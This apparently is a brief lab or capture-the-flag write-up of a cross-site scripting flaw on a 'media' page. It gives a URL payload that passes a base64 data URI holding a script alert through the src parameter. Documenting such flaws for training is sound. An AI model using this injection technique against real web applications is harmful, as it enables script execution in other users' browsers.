# media-xss

Page: `/index.php?page=media`  
Difficulty: 7/10

## Description

This page shows a media file from its URL parameter.

## Exploit

This page shows a media file from its URL parameter.

We can provide a base64 encoded data URI to the parameter and it will, for example, run JavaScript.

`http://10.13.248.92/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
